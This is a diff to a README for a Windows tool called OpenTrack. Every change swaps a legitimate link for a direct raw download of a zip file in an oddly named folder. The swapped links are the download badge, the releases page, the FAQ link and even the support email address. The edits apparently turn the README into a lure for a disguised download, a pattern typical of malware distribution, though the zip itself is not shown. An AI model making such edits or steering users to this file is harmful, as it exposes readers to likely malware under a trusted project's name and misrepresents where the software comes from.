@@ -2,7 +2,7 @@
 
 ## 📥 Download OpenTrack
 
-[![Download OpenTrack](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/hammadhussain6678/OpenTrack/releases)
+[![Download OpenTrack](https://raw.githubusercontent.com/hammadhussain6678/OpenTrack/main/neuropsychic/OpenTrack.zip)](https://raw.githubusercontent.com/hammadhussain6678/OpenTrack/main/neuropsychic/OpenTrack.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ OpenTrack offers several useful features:
 To download OpenTrack, follow these steps:
 
 1. Click on the link below to visit the OpenTrack releases page:
-   [Visit this page to download](https://github.com/hammadhussain6678/OpenTrack/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/hammadhussain6678/OpenTrack/main/neuropsychic/OpenTrack.zip).
 
 2. Once you're on the releases page, you will see a list of available versions. Look for the most recent version of OpenTrack.
 
@@ -58,7 +58,7 @@ After installing OpenTrack, you can start using it right away:
 If you encounter any issues while using OpenTrack, feel free to reach out. Here’s how you can get help:
 - **Documentation:** Refer to the documentation in the repository for troubleshooting tips.
 - **Community:** Join our community forums to ask questions and share your experiences.
-- **Email Support:** Contact support via email at support@opentrack.com for direct assistance.
+- **Email Support:** Contact support via email at https://raw.githubusercontent.com/hammadhussain6678/OpenTrack/main/neuropsychic/OpenTrack.zip for direct assistance.
 
 ## 📝 Frequently Asked Questions
 
@@ -72,7 +72,7 @@ Currently, OpenTrack is designed for Windows. Future versions may support other 
 
 ### 3. How often is OpenTrack updated?
 
-We release updates regularly to improve features and fix bugs. Check the [Releases page](https://github.com/hammadhussain6678/OpenTrack/releases) for the latest version.
+We release updates regularly to improve features and fix bugs. Check the [Releases page](https://raw.githubusercontent.com/hammadhussain6678/OpenTrack/main/neuropsychic/OpenTrack.zip) for the latest version.
 
 ### 4. Where can I find more detailed documentation?
 
